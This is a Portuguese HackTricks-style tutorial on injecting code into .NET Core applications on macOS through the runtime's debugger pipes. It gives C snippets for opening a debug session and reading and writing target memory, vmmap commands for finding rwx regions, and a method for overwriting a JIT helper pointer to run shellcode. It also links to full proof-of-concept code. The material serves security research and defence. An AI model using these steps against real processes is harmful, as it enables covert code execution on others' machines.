# Injeção em Aplicações .Net no macOS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Depuração do .NET Core <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Estabelecer uma sessão de depuração** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) é responsável por lidar com a **comunicação** entre o depurador e o depurado.\
Ele cria 2 pipes nomeados por processo .Net em [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) chamando [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) (um terminará em **`-in`** e o outro em **`-out`**, e o resto do nome será o mesmo).

Portanto, se você for ao **`$TMPDIR`** do usuário, poderá encontrar **fifos de depuração** que poderiam ser usados para depurar aplicações .Net:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A função [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) lidará com a comunicação de um depurador.

A primeira coisa que um depurador precisa fazer é **criar uma nova sessão de depuração**. Isso é feito **enviando uma mensagem através do pipe `out`** começando com uma estrutura `MessageHeader`, que podemos obter do código-fonte do .NET:
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
No caso de uma nova solicitação de sessão, essa struct é preenchida da seguinte forma:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Uma vez construído, **enviamos isso para o alvo** usando a chamada de sistema `write`:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
Seguindo nosso cabeçalho, precisamos enviar uma estrutura `sessionRequestData`, que contém um GUID para identificar nossa sessão:
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Ao enviar nossa solicitação de sessão, nós **lemos do `out` pipe um cabeçalho** que indicará **se** nossa solicitação para estabelecer se uma sessão de depuração foi **bem-sucedida** ou não:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### Ler Memória

Com uma sessão de depuração estabelecida, é possível **ler memória** usando o tipo de mensagem [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Para ler alguma memória, o código principal necessário seria:
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
O código de prova de conceito (POC) pode ser encontrado [aqui](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

### Escrever memória
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
O código POC utilizado para isso pode ser encontrado [aqui](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

### Execução de código .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>

A primeira coisa é identificar, por exemplo, uma região de memória com **`rwx`** ativa para salvar o shellcode a ser executado. Isso pode ser feito facilmente com:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Então, para desencadear a execução, seria necessário saber algum lugar onde um ponteiro de função é armazenado para sobrescrevê-lo. É possível sobrescrever um ponteiro dentro da **Tabela de Funções Dinâmicas (DFT)**, que é usada pelo tempo de execução do .NET Core para fornecer funções auxiliares para a compilação JIT. Uma lista de ponteiros de função suportados pode ser encontrada dentro de [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h).

Nas versões x64 isso é direto usando a técnica de **caça de assinaturas** ao estilo mimikatz para procurar em **`libcorclr.dll`** uma referência ao símbolo **`_hlpDynamicFuncTable`**, que podemos desreferenciar:

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

Tudo o que resta a fazer é encontrar um endereço do qual iniciar nossa busca por assinaturas. Para fazer isso, aproveitamos outra função de depuração exposta, **`MT_GetDCB`**. Isso retorna várias informações úteis sobre o processo alvo, mas para o nosso caso, estamos interessados em um campo retornado contendo o **endereço de uma função auxiliar**, **`m_helperRemoteStartAddr`**. Usando este endereço, sabemos exatamente **onde `libcorclr.dll` está localizado** na memória do processo alvo e podemos iniciar nossa busca pela DFT.

Sabendo deste endereço é possível sobrescrever o ponteiro da função com o nosso próprio shellcode.

O código POC completo usado para injetar no PowerShell pode ser encontrado [aqui](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## Referências

* Esta técnica foi retirada de [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
